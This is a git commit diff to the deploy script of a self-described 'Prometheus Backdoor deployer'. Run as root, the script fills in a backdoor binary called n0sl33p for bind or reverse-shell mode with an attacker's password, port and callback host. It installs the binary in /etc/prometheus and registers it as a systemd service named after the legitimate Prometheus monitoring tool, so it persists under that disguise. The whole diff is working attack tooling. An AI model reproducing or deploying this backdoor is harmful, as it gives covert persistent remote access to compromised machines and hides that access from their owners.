2a8c625d4ad3b7fdf3e8dae525999737d50f52fe
Nim <Nim@localhost.localdomain>
2019-12-11 10:19:30 +0100

    working with absolute paths

--- deploy.sh
+++ deploy.sh
@@ -6,6 +6,8 @@
 echo "Prometheus Backdoor deployer, v0.1"
 echo ""
 
+workdir=`pwd`
+
 if [ "$UID" != "0" ];
 then
 	echo "Script must be run as root."
@@ -35,18 +37,19 @@ if [ "$1" = "bind" ];
 then
     echo "[*] Deploying prometheus in bind mode"
     echo "[*] Creating n0sl33p with your parameters..."
-	sed "s/DEFAULTPASSWORD/$3/g" n0sl33p_default > n0sl33p
-	sed -i "s/DEFAULTMODE/bind/g" n0sl33p
-	sed -i "s/65456/$2/g" n0sl33p
+	sed "s/DEFAULTPASSWORD/$3/g" $workdir/n0sl33p_default > $workdir/n0sl33p
+	sed -i "s/DEFAULTMODE/bind/g" $workdir/n0sl33p
+	sed -i "s/65456/$2/g" $workdir/n0sl33p
 	echo "[+] Done!"
 	echo "[*] Creating necessary folders and files..."
 	mkdir /etc/prometheus
-	chmod 700 /etc/prometheus
-	mv n0sl33p /etc/prometheus
 	chmod 500 /etc/prometheus
+	mv $workdir/n0sl33p /etc/prometheus
 	chmod 555 /etc/prometheus/n0sl33p
-	cp prometheus.service /lib/systemd/system/
+	cp $workdir/prometheus.service /lib/systemd/system/
 	chmod 500 /lib/systemd/system/prometheus.service
+	cp $workdir/cleanup.sh /etc/prometheus
+	chmod 555 /etc/prometheus/cleanup.sh
 	echo "[*] Starting and enabling service..."
 	systemctl daemon-reload
 	systemctl start prometheus
@@ -57,19 +60,19 @@ elif [ "$1" = "reverse" ];
 then
     echo "[*] Deploying prometheus in reverse mode"
     echo "[*] Creating n0sl33p with your parameters..."
-	sed "s/localhost/$2/g" n0sl33p_default > n0sl33p
-	sed -i "s/DEFAULTMODE/reverse/g" n0sl33p
-	sed -i "s/65456/$3/g" n0sl33p
-	sed -i "s/retrytime=2/retrytime=$4/g" n0sl33p
+	sed "s/localhost/$2/g" $workdir/n0sl33p_default > n0sl33p
+	sed -i "s/DEFAULTMODE/reverse/g" $workdir/n0sl33p
+	sed -i "s/65456/$3/g" $workdir/n0sl33p
+	sed -i "s/retrytime=2/retrytime=$4/g" $workdir/n0sl33p
 	echo "[+] Done!"
 	echo "[*] Creating necessary folders and files..."
 	mkdir /etc/prometheus
 	chmod 500 /etc/prometheus
-	mv n0sl33p /etc/prometheus
+	mv $workdir/n0sl33p /etc/prometheus
 	chmod 555 /etc/prometheus/n0sl33p
-	cp cleanup.sh /etc/prometheus
+	cp $workdir/cleanup.sh /etc/prometheus
 	chmod 555 /etc/prometheus/cleanup.sh
-	cp prometheus.service /lib/systemd/system/
+	cp $workdir/prometheus.service /lib/systemd/system/
 	chmod 500 /lib/systemd/system/prometheus.service
 	echo "[*] Starting and enabling service..."
 	systemctl daemon-reload
